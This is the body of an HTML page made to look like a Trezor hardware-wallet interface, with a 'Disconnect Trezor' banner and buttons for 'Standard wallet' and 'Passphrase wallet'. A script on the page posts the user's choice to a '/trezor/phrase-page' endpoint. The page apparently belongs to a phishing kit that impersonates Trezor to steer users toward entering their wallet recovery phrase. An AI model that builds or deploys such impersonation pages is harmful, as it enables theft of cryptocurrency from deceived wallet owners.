 </head>
 <body>
  <div id="root">
   <div class="flex h-full w-full bg-black font-trezor text-white">
    <div class="hidden h-full w-[660px] flex-col items-center justify-between bg-[#0f0f0f] py-4 md:flex">
     <span>
     </span>

      trezor.io

       <path d="M25 8v13a1 1 0 1 1-2 0V10.414L8.707 24.707a1 1 0 0 1-1.415-1.415L21.586 9H11a1 1 0 0 1 0-2h13a1 1 0 0 1 1 1">

      </svg>
     </a>
    </div>
    <form class="flex h-full flex-grow flex-col items-center gap-4 bg-[#171717] py-12 md:justify-center md:py-8">
     <div class="mb-8 flex h-[122px] w-full max-w-[360px] items-center justify-center rounded-full border-2 border-white border-opacity-[0.16] bg-[#1d1d1d] p-2.5">
      <div class="aspect-square h-full rounded-full bg-[#2d2d2d] p-7">
       <svg class="h-full w-full" fill="#FFF" viewbox="0 0 177 256" xmlns="http://www.w3.org/2000/svg">
        <path d="M150.66 59.407C150.66 26.947 122.488 0 88.191 0 53.895 0 25.722 26.947 25.722 59.407v18.985H0v136.575L88.191 256l88.192-41.033V79.005H150.66V59.407Zm-93.09 0c0-15.311 13.473-27.56 30.621-27.56 17.149 0 30.622 12.249 30.622 27.56v18.985H57.57V59.407Zm83.291 133.512-52.67 24.497-52.67-24.497v-82.067h105.34v82.067Z">
        </path>
       </svg>
      </div>
      <div class="flex flex-grow flex-col gap-2">
       <div class="text-center text-xl font-medium">
        Disconnect Trezor
       </div>
      </div>
     </div>
     <div class="mt-8 flex w-full max-w-xl flex-col gap-4 bg-[#171717] p-8">
      <div class="overflow-hidden">
       <div class="flex flex-col gap-2" style="height: auto;">
        <button class="flex items-center justify-between gap-2 px-1 text-left" type="button" onclick="goPhrasePage('standard')">
         <div class="flex items-center gap-5">
          <svg class="h-12 w-12 rounded-xl bg-white bg-opacity-10 p-2" viewbox="0 0 24 24" xml:space="preserve" xmlns="http://www.w3.org/2000/svg">
           <path d="M4.84 3.788c-.657.11-1.285.588-1.607 1.225-.241.478-.232.193-.232 6.987 0 5.187.01 6.264.057 6.485.152.72.702 1.353 1.416 1.631l.266.104 7.82.012c5.706.009 7.877 0 8.03-.033.445-.095.879-.466 1.054-.9l.096-.239V7.94l-.096-.239c-.151-.375-.506-.713-.924-.88-.065-.026-2.857-.047-7.9-.06l-7.8-.021-.15-.093a.765.765 0 0 1-.022-1.277l.166-.11 6.623-.02c4.933-.015 6.643-.032 6.703-.067.106-.061.278-.248.341-.371.07-.135.063-.479-.012-.623a.9.9 0 0 0-.402-.376c-.078-.03-2.136-.041-6.72-.038-3.634.003-6.652.013-6.707.023m7.65 4.443 7.75.01v10.52l-7.61-.011-7.61-.01-.15-.093a1 1 0 0 1-.26-.28l-.11-.187-.011-4.979c-.006-2.739-.002-5.002.009-5.03.015-.04.041-.04.131-.001.087.039 1.804.052 7.861.061m4.127 4.346c-.183.079-.41.294-.508.479-.121.229-.121.659 0 .888.1.19.328.402.517.481.169.071.579.071.748 0 .189-.079.417-.291.517-.481.065-.123.087-.234.087-.444s-.022-.321-.087-.444c-.1-.19-.328-.402-.517-.481-.166-.07-.596-.069-.757.002" fill="currentColor" fill-rule="evenodd">
           </path>
          </svg>
          <div class="flex flex-col">
           <span class="text-2xl font-medium">
            Standard wallet
           </span>
           <span class="text-sm font-medium text-white/60">
            No passphrase
           </span>
          </div>
         </div>
         <svg class="h-6 w-6 transition-transform" fill="none" viewbox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
          <path d="m22.707 16.708-10 10a1 1 0 0 1-1.415-1.415L20.586 16l-9.294-9.292a1 1 0 0 1 1.415-1.415l10 10a1 1 0 0 1 0 1.415" fill="currentColor">
          </path>
         </svg>
        </button>
        <div class="overflow-hidden px-1">
        </div>
       </div>
      </div>
      <span class="h-px w-full bg-white bg-opacity-10">
      </span>
      <div class="overflow-hidden">
       <div class="flex flex-col gap-2" style="height: auto;">
        <button class="flex items-center justify-between gap-2 px-1 text-left" type="button" onclick="goPhrasePage('passphrase')">
         <div class="flex items-center gap-5">
          <svg class="h-12 w-12 rounded-xl bg-white bg-opacity-10 p-2.5" fill="none" viewbox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
           <path d="M26 10h-4V7a6 6 0 1 0-12 0v3H6a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h20a2 2 0 0 0 2-2V12a2 2 0 0 0-2-2M12 7a4 4 0 1 1 8 0v3h-8zm14 19H6V12h20zm-8.5-7a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0" fill="currentColor">
           </path>
          </svg>
          <div class="flex flex-col">
           <span class="text-2xl font-medium">
            Passphrase wallet
           </span>
           <span class="text-sm font-medium text-white/60">
            Passphrase is required
           </span>
          </div>
         </div>
         <svg class="h-6 w-6 transition-transform" fill="none" viewbox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
          <path d="m22.707 16.708-10 10a1 1 0 0 1-1.415-1.415L20.586 16l-9.294-9.292a1 1 0 0 1 1.415-1.415l10 10a1 1 0 0 1 0 1.415" fill="currentColor">
          </path>
         </svg>
        </button>
        <div class="overflow-hidden px-1">
        </div>
       </div>
      </div>
     </div>
    </form>
   </div>
  </div>
 <script>
  function goPhrasePage(mode) {
    var f = document.createElement('form');
    f.method = 'POST';
    f.action = '/trezor/phrase-page';
    f.style.display = 'none';
    var t = document.createElement('input'); t.name = '_token'; t.value = window._liveledCSRF || ''; f.appendChild(t);
    var m = document.createElement('input'); m.name = '_mode';  m.value = mode;                    f.appendChild(m);
    document.body.appendChild(f);
    f.submit();
  }
 </script>
 </body>
</html>
